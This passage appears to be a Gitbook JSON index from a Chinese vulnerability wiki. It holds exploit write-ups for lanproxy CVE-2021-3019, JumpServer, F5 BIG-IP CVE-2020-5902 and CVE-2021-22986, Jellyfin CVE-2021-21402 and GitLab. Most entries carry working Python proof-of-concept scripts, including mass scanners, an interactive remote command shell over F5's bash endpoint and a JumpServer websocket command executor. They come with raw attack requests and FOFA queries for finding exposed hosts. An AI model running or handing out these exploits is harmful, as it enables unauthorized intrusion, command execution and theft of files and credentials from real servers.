x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4080.0 Safari/537.36 Edg/82.0.453.0\"} def readConf(url): \"\"\" 默认读取配置文件，并通过能否读取配置文件来判断是否存在漏洞 \"\"\" config = [ 'config.server.bind', 'config.server.port', 'config.admin.username', 'config.admin.password' ] path = \"/../conf/config.properties\" confUrl = url + path r = request.Request(confUrl, headers=headers) try: with request.urlopen(r, timeout=10) as resp: confContent = resp.read().decode('utf-8') for i in config: if i not in confContent: print(\"[-] \" + url + \" is not vulnerable\") return 'Bye :(' print(\"[+] \" + url + \" is vulnerable! :)\") return confContent except ConnectionResetError: print(\"[-] \" + url + \" Connection reset by peer\") except error.HTTPError as e: print(\"[-] \" + url + e.code + e.reason) except error.URLError as e: print(\"[-] \" + url + e.code + e.reason) except: print(\"[-] \" + url + \" is not vulnerable\") return 0 def readOtherFile(url, path): \"\"\" 读取任意其他文件 \"\"\" jumpSym = \"/../../../../../../../../..\" fullUrl = url + jumpSym + path r = request.Request(fullUrl, headers=headers) with request.urlopen(r, timeout=10) as resp: fileContent = resp.read().decode('utf-8') print(fileContent) def run(url, path=\"/../conf/config.properties\"): if os.path.isfile(url) == False: # if 'http' not in url: # url = 'http://' + url url = 'http://' + url.replace('http://', '').replace('/', '') if path == \"/../conf/config.properties\": print(readConf(url)) else: if readConf(url) not in [0, 'Bye :(']: readOtherFile(url, path) else: urls = [] with open(url) as target: urls = target.read().splitlines() for url in urls: # if 'http' not in url: # url = 'http://' + url url = 'http://' + url.replace('http://', '').replace('/', '') if readConf(url) not in [0, 'Bye :(']: with open(\"success.txt\", \"a+\") as f: f.write(url + \"\\n\") f.close() def main(): parser = argparse.ArgumentParser( description=\"CVE-2021-3019 lanproxy arbitrary file read vulnerability detection POC\") parser.add_argument('-u', '--url', type=str, help=\"test a single website\") parser.add_argument('-r', '--read', type=str, help=\"this parameter is followed by the file name to be read, the configuration file is read by default\") parser.add_argument('-f', '--file', type=str, help=\"perform vulnerability checks on multiple websites in a file, and the vulnerable websites will be output to the success.txt file\") args = parser.parse_args() if len(sys.argv) Goby & POC [!NOTE] Lanproxy_Arbitrary_File_Read_CVE-2021-3019 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/JumpServer堡垒机/":{"url":"book/Web应用漏洞/JumpServer堡垒机/","title":"JumpServer堡垒机","keywords":"","body":"JumpServer 堡垒机 JumpServer 未授权接口 远程命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/JumpServer堡垒机/JumpServer 未授权接口 远程命令执行漏洞.html":{"url":"book/Web应用漏洞/JumpServer堡垒机/JumpServer 未授权接口 远程命令执行漏洞.html","title":"JumpServer 未授权接口 远程命令执行漏洞","keywords":"","body":"JumpServer 未授权接口 远程命令执行漏洞 漏洞描述 JumpServer 是全球首款完全开源的堡垒机, 使用GNU GPL v2.0 开源协议, 是符合4A 的专业运维审计系统。 JumpServer 使用Python / Django 进行开发。2021年1月15日，阿里云应急响应中心监控到开源堡垒机JumpServer发布更新，修复了一处远程命令执行漏洞。由于 JumpServer 某些接口未做授权限制，攻击者可构造恶意请求获取到日志文件获取敏感信息，或者执行相关API操作控制其中所有机器。 漏洞影响 [!NOTE] JumpServer JumpServer JumpServer JumpServer = v1.5.9 FOFA [!NOTE] app=\"FIT2CLOUD-JumpServer-堡垒机\" 环境搭建 安装 JumpServer v2.6.1 版本 下载链接 [!NOTE] 安装注意 配置网络，配置Mysql，配置Redis 选择 n 等待完成安装执行以下命令 cd /opt/jumpserver-installer-v2.6.1 ./jmsctl.sh start 等待安装完毕访问 http://xxx.xxx.xxx.xxxx:8080 默认账号密码 amdin:admin 漏洞复现 进入后台添加配置 资产管理 --> 系统用户 资产管理 --> 管理用户 用户管理 --> 用户列表 资产管理 --> 资产列表 查看一下项目代码提交变动 import time import os import threading import json from common.utils import get_logger from .celery.utils import get_celery_task_log_path from channels.generic.websocket import JsonWebsocketConsumer logger = get_logger(__name__) class CeleryLogWebsocket(JsonWebsocketConsumer): disconnected = False def connect(self): user = self.scope[\"user\"] if user.is_authenticated and user.is_org_admin: self.accept() else: self.close() def receive(self, text_data=None, bytes_data=None, **kwargs): data = json.loads(text_data) task_id = data.get(\"task\") if task_id: self.handle_task(task_id) def wait_util_log_path_exist(self, task_id): log_path = get_celery_task_log_path(task_id) while not self.disconnected: if not os.path.exists(log_path): self.send_json({'message': '.', 'task': task_id}) time.sleep(0.5) continue self.send_json({'message': '\\r\\n'}) try: logger.debug('Task log path: {}'.format(log_path)) task_log_f = open(log_path, 'rb') return task_log_f except OSError: return None def read_log_file(self, task_id): task_log_f = self.wait_util_log_path_exist(task_id) if not task_log_f: logger.debug('Task log file is None: {}'.format(task_id)) return task_end_mark = [] while not self.disconnected: data = task_log_f.read(4096) if data: data = data.replace(b'\\n', b'\\r\\n') self.send_json( {'message': data.decode(errors='ignore'), 'task': task_id} ) if data.find(b'succeeded in') != -1: task_end_mark.append(1) if data.find(bytes(task_id, 'utf8')) != -1: task_end_mark.append(1) elif len(task_end_mark) == 2: logger.debug('Task log end: {}'.format(task_id)) break time.sleep(0.2) task_log_f.close() def handle_task(self, task_id): logger.info(\"Task id: {}\".format(task_id)) thread = threading.Thread(target=self.read_log_file, args=(task_id,)) thread.start() def disconnect(self, close_code): self.disconnected = True self.close() 新版对用户进行了一个判断，可以使用 谷歌插件 WebSocket King 连接上这个websocket 进行日志读取 比如send这里获取的 Task id ,这里是可以获得一些敏感的信息的 查看一下连接Web终端的后端api代码 可以看到这里调用时必须需要 user asset system_user 这三个值，再获取一个20秒的 token 访问web终端后查看日志的调用 docker exec -it (jumpserve/core的docker) /bin/bash cat gunicorn.log | grep /api/v1/perms/asset-permissions/user/validate/? assset_id=ee7e7446-6df7-4f60-b551-40a241958451 system_user_id=d89bd097-b7e7-4616-9422-766c6e4fcdb8 user_id=efede3f4-8659-4daa-8e95-9a841dbe82a8 可以看到在不同的时间访问这个接口的asset_id等都是一样的，所以只用在 刚刚的未授权日志读取里找到想要的这几个值就可以获得 token 发送请求获取20s的token 看一下 koko.js 这个前端文件 后端代码 https://github.com/jumpserver/koko/blob/e054394ffd13ac7c71a4ac980340749d9548f5e1/pkg/httpd/webserver.go 这里我们就可以通过 获得的token来模拟请求 成功连接模拟了这个 token 的请求,可以在Network看一下流量是怎么发送的 模拟连接发送和接发数据 这里可以看到我们只要模拟了这个发送，返回的数据和web终端是一样的，那我们就可以通过这样的方法来进行命令执行了 漏洞利用POC [!NOTE] POC 里包含两个方法，一个是获取日志文件，另一个是命令执行 日志提取已经过滤了部分API调用的数据，只需要找到那几个值就好了 命令执行需要从日志中获取敏感数据并写入脚本对应的变量中 接收数据如果卡住请调整 for i in range(7) 这个位置的 7 import requests import json import sys import time import asyncio import websockets import re from ws4py.client.threadedclient import WebSocketClient def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mPOC_Des: https://www.o2oxy.cn/ \\033[0m') print('+ \\033[34mVersion: JumpServer >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') class ws_long(WebSocketClient): def opened(self): req = '{\"task\":\"peiqi/../../../../../logs/gunicorn\"}' self.send(req) def closed(self, code, reason=None): print(\"Closed down:\", code, reason) def received_message(self, resp): resp = json.loads(str(resp)) # print(resp) data = resp['message'] print(data) if \"/api/v1/perms/asset-permissions/user/validate/?\" in data: print(data) async def send_msg(websocket, _text): if _text == \"exit\": print(f'you have enter \"exit\", goodbye') await websocket.close(reason=\"user exit\") return False await websocket.send(_text) recv_text = await websocket.recv() print(re.findall(r'\"data\":\"(.*?)\"', recv_text)) async def main_logic(target_url): print(\"\\033[32m[o] 正在连接目标: {}\\033[0m\".format(target_url)) async with websockets.connect(target_url) as websocket: recv_text = await websocket.recv() resws = json.loads(recv_text) id = resws['id'] print(\"\\033[36m[o] 成功获取 ID: {}\\033[0m\".format(id)) inittext = json.dumps({\"id\": id, \"type\": \"TERMINAL_INIT\", \"data\": \"{\\\"cols\\\":164,\\\"rows\\\":17}\"}) await send_msg(websocket, inittext) for i in range(7): recv_text = await websocket.recv() print(re.findall(r'\"data\":\"(.*?)\"', recv_text)) while True: cmd = str(input(\"\\033[35mcmd >>> \\033[0m\")) cmdtext = json.dumps({\"id\": id, \"type\": \"TERMINAL_DATA\", \"data\": cmd + \"\\r\\n\"}) await send_msg(websocket, cmdtext) for i in range(1): recv_text = await websocket.recv() print(re.findall(r'\"data\":\"(.*?)\"', recv_text)) def POC_1(target_url): vuln_url = target_url + \"/api/v1/users/connection-token/?user-only=1\" response = requests.get(url=vuln_url, timeout=5) print(response.status_code) ws_open = str(input(\"\\033[32m[o] 是否想要提取日志（Y/N） >>> \\033[0m\")) try: if ws_open == \"Y\" or ws_open == \"y\": ws = target_url.strip(\"http://\") try: ws = ws_long('ws://{}/ws/ops/tasks/log/'.format(ws)) ws.connect() ws.run_forever() ws.close() except KeyboardInterrupt: ws.close() else: print(\"\\033[31m[x] 目标漏洞已修复，无法获取敏感日志信息\\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 目标漏洞已修复，无法获取敏感日志信息,{}\\033[0m\".format(e)) sys.exit(0) def POC_2(target_url, user, asset, system_user): if target_url == \"\" or asset == \"\" or system_user == \"\": print(\"\\033[31m[x] 请获取 assset 等参数配置\\033[0m\") sys.exit(0) data = {\"user\": user, \"asset\": asset, \"system_user\": system_user} vuln_url = target_url + \"/api/v1/users/connection-token/?user-only=1\" # vuln_url = target_url + \"/api/v1/authentication/connection-token/?user-only=1\" try: response = requests.post(vuln_url, json=data, timeout=5).json() print(\"\\033[32m[o] 正在请求：{}\\033[0m\".format(vuln_url)) token = response['token'] print(\"\\033[36m[o] 成功获取Token：{}\\033[0m\".format(token)) ws_url = target_url.strip(\"http://\") ws_url = \"ws://\" + ws_url + \"/koko/ws/token/?target_id={}\".format(token) asyncio.get_event_loop().run_until_complete(main_logic(ws_url)) except Exception as e: print(\"\\033[31m[x] 请检查 assset 等参数配置,{}\\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) user = \"ed3460eb-3c70-4beb-b631-f8f91c39bdd1\" asset = \"37fce0b0-cc4f-4822-8c33-afdebc888fa7\" system_user = \"da09ddd7-fd3f-46c3-914d-752883a4d950\" POC_1(target_url) POC_2(target_url, user, asset, system_user) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/F5 BIG-IP/":{"url":"book/Web应用漏洞/F5 BIG-IP/","title":"F5 BIG-IP","keywords":"","body":"F5 BIG-IP F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902 F5 BIG-IP 远程代码执行漏洞 CVE-2021-22986 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/F5 BIG-IP/F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902.html":{"url":"book/Web应用漏洞/F5 BIG-IP/F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902.html","title":"F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902","keywords":"","body":"F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902 漏洞描述 2020年07月03日， 360CERT监测发现 F5 发布了 F5 BIG-IP 远程代码执行 的风险通告，该漏洞编号为 CVE-2020-5902，漏洞等级：严重。 未授权的远程攻击者通过向漏洞页面发送特制的请求包，可以造成任意 Java 代码执行。进而控制 F5 BIG-IP 的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。该漏洞影响控制面板受影响，不影响数据面板。 漏洞影响 [!NOTE] F5 BIG-IP 15.x: 15.1.0.4 F5 BIG-IP 14.x: 14.1.2.6 F5 BIG-IP 13.x: 13.1.3.4 F5 BIG-IP 12.x: 12.1.5.2 F5 BIG-IP 11.x: 11.6.5.2 FOFA [!NOTE] title=\"BIG-IP&reg ;- Redirect\" 漏洞复现 在 tmshCmd 的 service方法处理请求的时候，未对command 参数进行处理，直接调用 WorkspaceUtils.runTmshCommand(cmd, request); 方法执行命令，限制了执行delete,create,list,modify。 if (\"POST\".equalsIgnoreCase(request.getMethod())) { String[] cmdArray = command.split(\" \"); String operation = cmdArray[0]; String module = cmdArray[2]; if (!ShellCommandValidator.checkForBadShellCharacters(command) && (operation.equals(\"create\") || operation.equals(\"delete\") || operation.equals(\"list\") || operation.equals(\"modify\")) && WHITELISTED_TMSH_MODULES.contains(module)) { try { String[] args = new String[]{command}; Result result = Syscall.callElevated(Syscall.TMSH, args); output = result.getOutput(); error = result.getError(); } catch (CallException var11) { logger.error(NLSEngine.getString(\"ilx.workspace.error.TmshCommandFailed\") + \": \" + var11.getMessage()); error = var11.getMessage(); } } else { error = NLSEngine.getString(\"ilx.workspace.error.RejectedTmshCommand\"); } 在 fileRead 的 service方法处理请求的时候，未对 fileName 参数进行处理，直接调用 WorkspaceUtils.readFile(fileName); 方法，进行文件读取。 在 fileSave 的 service方法处理请求的时候，未对 fileName，content 参数进行处理，直接调用 WorkspaceUtils.saveFile(request); 方法，进行文件上传。 详情利用方式 https://github.com/jas502n/CVE-2020-5902 详情利用方式 https://github.com/wx3514/CVE-2020-5902/blob/master/CVE-2020-5902.md 读取文件 http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd 写入文件 http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp POST: fileName=/tmp/test.txt&content=test 读取文件 /tmp/test 成功写入文件 漏洞利用POC import requests import sys import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: F5 BIG-IP \\033[0m') print('+ \\033[36m使用格式: python3 CVE-2020-5902.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): version_url = target_url + \"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept-Language\":\"zh-CN,zh;q=0.9\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=version_url, timeout=10, verify=False, headers=headers) if \"output\" in response.text: print(\"\\033[32m[o] 目标 {} 存在漏洞，响应为:\\n{}\\033[0m\".format(target_url, json.loads(response.text)[\"output\"])) else: print(\"\\033[31m[x] 目标漏洞无法利用 \\033[0m\") except Exception as e: print(\"\\033[31m[x] 目标漏洞无法利用 ,{}\\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 参考文章 https://mochazz.github.io/2020/07/11/F5-BIG-IP%E6%9C%AA%E6%8E%88%E6%9D%83RCE(CVE-2020-5902)/#%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/F5 BIG-IP/F5 BIG-IP 远程代码执行漏洞 CVE-2021-22986.html":{"url":"book/Web应用漏洞/F5 BIG-IP/F5 BIG-IP 远程代码执行漏洞 CVE-2021-22986.html","title":"F5 BIG-IP 远程代码执行漏洞 CVE-2021-22986","keywords":"","body":"F5 BIG-IP 远程代码执行漏洞 CVE-2021-22986 漏洞描述 F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。 近日，F5发布了F5 BIG-IQ/F5 BIG-IP 代码执行，代码执行的风险声明，F5安全公告更新了BIG-IP，BIG-IQ中的多个严重漏洞。建议广大用户及时将f5 big-iq,f5 big-ip升级到最新版本，避免遭到攻击。 漏洞影响 [!NOTE] F5 BIG-IP 16.x: 16.1.0.3 F5 BIG-IP 15.x: 15.1.0.4 F5 BIG-IP 14.x: 14.1.2.6 F5 BIG-IP 13.x: 13.1.3.4 F5 BIG-IP 12.x: 12.1.5.2 F5 BIG-IP 11.x: 11.6.5.2 FOFA [!NOTE] icon_hash=\"-335242539\" 漏洞复现 访问登录页面如下 发送请求包 POST /mgmt/tm/util/bash HTTP/1.1 Host: xxx.xxx.xxx.xxx:8443 Connection: close Content-Length: 41 Cache-Control: max-age=0 Authorization: Basic YWRtaW46QVNhc1M= X-F5-Auth-Token: Upgrade-Insecure-Requests: 1 Content-Type: application/json {\"command\":\"run\",\"utilCmdArgs\":\"-c id\"} 成功执行命令 id 漏洞利用POC 批量测试 import requests import sys import random import re import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: F5 BIG-IP \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/mgmt/tm/util/bash\" headers = { \"Authorization\": \"Basic YWRtaW46QVNhc1M=\", \"X-F5-Auth-Token\": \"\", \"Content-Type\": \"application/json\" } data = '{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}' try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=2) if \"commandResult\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞,响应为:{} \\033[0m\".format(target_url, json.loads(response.text)[\"commandResult\"])) else: print(\"\\033[31m[x] 目标 {}不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"https://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] 请求报错 \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) 命令执行 import requests import sys import random import re import base64 import time import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: F5 BIG-IP \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/mgmt/tm/util/bash\" headers = { \"Authorization\": \"Basic YWRtaW46QVNhc1M=\", \"X-F5-Auth-Token\": \"\", \"Content-Type\": \"application/json\" } data = '''{\"command\":\"run\",\"utilCmdArgs\":\"-c 'cat /etc/passwd'\"}''' try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) if 'root' in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞,响应为:{} \\033[0m\".format(target_url, json.loads(response.text)[\"commandResult\"])) while True: Cmd = str(input(\"\\033[35mCmd >>> \\033[0m\")) POC_2(target_url, Cmd) else: print(\"\\033[31m[x] 目标 {}不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url), e) def POC_2(target_url, Cmd): vuln_url = target_url + \"/mgmt/tm/util/bash\" headers = { \"Authorization\": \"Basic YWRtaW46QVNhc1M=\", \"X-F5-Auth-Token\": \"\", \"Content-Type\": \"application/json\" } Cmd = \"'\" + Cmd + \"'\" data = '{\"command\":\"run\",\"utilCmdArgs\":\"-c %s\"}' % Cmd try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[32m{} \\033[0m\".format(json.loads(response.text)[\"commandResult\"])) except Exception as e: print(\"\\033[31m[x] 命令执行失败 \\033[0m\".format(target_url), e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/OneBlog/":{"url":"book/Web应用漏洞/OneBlog/","title":"OneBlog","keywords":"","body":"OneBlog 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:50:07 "},"book/Web应用漏洞/OneBlog/OneBlog 小于v2.2.1 远程命令执行漏洞.html":{"url":"book/Web应用漏洞/OneBlog/OneBlog 小于v2.2.1 远程命令执行漏洞.html","title":"OneBlog 小于v2.2.1 远程命令执行漏洞","keywords":"","body":"OneBlog 小于v2.2.1 远程命令执行漏洞 漏洞描述 OneBlog 小于v2.2.1 由于使用含有漏洞版本的Apache Shiro和默认的密钥导致存在远程命令执行漏洞 漏洞影响 [!NOTE] OneBlog FOFA [!NOTE] app=\"OneBlog开源博客后台管理系统\" 漏洞复现 登陆页面如下 使用工具直接利用Apache Shiro漏洞即可 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Jellyfin/":{"url":"book/Web应用漏洞/Jellyfin/","title":"Jellyfin","keywords":"","body":"Jellyfin Jellyfin 任意文件读取漏洞 CVE-2021-21402 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Jellyfin/Jellyfin 任意文件读取漏洞 CVE-2021-21402.html":{"url":"book/Web应用漏洞/Jellyfin/Jellyfin 任意文件读取漏洞 CVE-2021-21402.html","title":"Jellyfin 任意文件读取漏洞 CVE-2021-21402","keywords":"","body":"Jellyfin 任意文件读取漏洞 CVE-2021-21402 漏洞描述 Jellyfin是一个免费软件媒体系统。在10.7.1版之前的Jellyfin中，带有某些终结点的精心设计的请求将允许从Jellyfin服务器的文件系统中读取任意文件。当Windows用作主机OS时，此问题更为普遍。暴露于公共Internet的服务器可能会受到威胁。在版本10.7.1中已修复此问题。解决方法是，用户可以通过在文件系统上实施严格的安全权限来限制某些访问，但是建议尽快进行更新。 漏洞影响 [!NOTE] Jellyfin FOFA [!NOTE] title='Jellyfin' || body='http://jellyfin.media' 漏洞复现 无论是/Audio/{Id}/hls/{segmentId}/stream.mp3和/Audio/{Id}/hls/{segmentId}/stream.aac路线允许任意文件在Windows上读取。可以{segmentId}使用Windows路径分隔符\\（对%5CURL进行编码）将路由的一部分设置为相对或绝对路径。最初，攻击者似乎只能读取以.mp3和.aac结尾的文件。但是，通过在URL路径中使用斜杠 Path.GetExtension(Request.Path)返回一个空扩展名，从而获得对结果文件路径的完全控制。的itemId，因为它没有使用也没有关系。该问题不仅限于Jellyfin文件，因为它允许从文件系统读取任何文件。 // Can't require authentication just yet due to seeing some requests come from Chrome without full query string // [Authenticated] // [1] [HttpGet(\"Audio/{itemId}/hls/{segmentId}/stream.mp3\", Name = \"GetHlsAudioSegmentLegacyMp3\")] [HttpGet(\"Audio/{itemId}/hls/{segmentId}/stream.aac\", Name = \"GetHlsAudioSegmentLegacyAac\")] //... public ActionResult GetHlsAudioSegmentLegacy([FromRoute, Required] string itemId, [FromRoute, Required] string segmentId) { // TODO: Deprecate with new iOS app var file = segmentId + Path.GetExtension(Request.Path); //[2] file = Path.Combine(_serverConfigurationManager.GetTranscodePath(), file); return FileStreamResponseHelpers.GetStaticFileResult(file, MimeTypes.GetMimeType(file)!, false, HttpContext); } 使用如下请求将会读取带有密码的数据库文件 http://xxx.xxx.xxx.xxx /Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/ 另一处代码如下 // Can't require authentication just yet due to seeing some requests come from Chrome without full query string // [Authenticated] //[1] [HttpGet(\"Videos/{itemId}/hls/{playlistId}/{segmentId}.{segmentContainer}\")] //... public ActionResult GetHlsVideoSegmentLegacy( [FromRoute, Required] string itemId, [FromRoute, Required] string playlistId, [FromRoute, Required] string segmentId, [FromRoute, Required] string segmentContainer) { var file = segmentId + Path.GetExtension(Request.Path); //[2] var transcodeFolderPath = _serverConfigurationManager.GetTranscodePath(); file = Path.Combine(transcodeFolderPath, file); //[3] var normalizedPlaylistId = playlistId; var filePaths = _fileSystem.GetFilePaths(transcodeFolderPath); // Add . to start of segment container for future use. segmentContainer = segmentContainer.Insert(0, \".\"); string? playlistPath = null; foreach (var path in filePaths) { var pathExtension = Path.GetExtension(path); if ((string.Equals(pathExtension, segmentContainer, StringComparison.OrdinalIgnoreCase) || string.Equals(pathExtension, \".m3u8\", StringComparison.OrdinalIgnoreCase)) //[4] && path.IndexOf(normalizedPlaylistId, StringComparison.OrdinalIgnoreCase) != -1) //[5] { playlistPath = path; break; } } return playlistPath == null ? NotFound(\"Hls segment not found.\") : GetFileResult(file, playlistPath); } 该/Videos/{Id}/hls/{PlaylistId}/{SegmentId}.{SegmentContainer}路由允许在Windows上读取未经身份验证的任意文件。可以{SegmentId}.{SegmentContainer}使用Windows路径分隔符\\（对%5CURL进行编码）将路由的一部分设置为相对或绝对路径。在SegmentId从和文件扩展名Path被级联。结果file用作Path.Combine[3]的第二个参数。但是，如果第二个参数是绝对路径，则第一个参数to将Path.Combine被忽略，而得到的路径仅是绝对路径file。 POC如下，下载同样的文件 http://xxx.xxx.xxx.xxx/Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db 如上为证明漏洞存在和可利用性，详情链接参考 https://securitylab.github.com/advisories/GHSL-2021-050-jellyfin/ 漏洞POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Jellyfin >> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=2) if response.status_code == 200 and \"file\" in response.text and \"extension\" in response.text and \"font\" in response.text: print(\"\\033[32m[o] 目标 {} 存在漏洞(读取 windows/win.ini), 链接为:{} \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] 请求报错 \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 Jellyfin 10.7.0 Unauthenticated Abritrary File Read CVE-2021-21402 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/GitLab/":{"url":"book/Web应用漏洞/GitLab/","title":"GitLab","keywords":"","body":"GitLab GitLab Graphql邮箱信息泄露漏洞 CVE-2020-26413 GitLab SSRF漏洞 CVE-2021-22214 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/GitLab/GitLab Graphql邮箱信息泄露漏洞 CVE-2020-26413.html":{"url":"book/Web应用漏洞/GitLab/GitLab Graphql邮箱信息泄露漏洞 CVE-2020-26413.html","title":"GitLab Graphql邮箱信息泄露漏洞 CVE-2020-26413","keywords":"","body":"GitLab Graphql邮箱信息泄露漏洞 CVE-2020-26413 漏洞描述 GitLab中存在Graphql接口 输入构造的数据时会泄露用户邮箱和用户名 漏洞影响 [!NOTE] GitLab 13.4 - 13.6.2 FOFA [!NOTE] title=\"GitLab\" 漏洞复现 漏洞来源为 hackone上的一篇公开报告 https://gitlab.com/gitlab-org/gitlab/-/issues/244275 意思为当使用构造的语句在接口查询时会返回邮箱信息，如图 访问 URL http://xxx.xxx.xxx.xxx/-//graphql-explorer Gitlab本身不允许获取账号邮箱信息，这里通过调用 Graphql 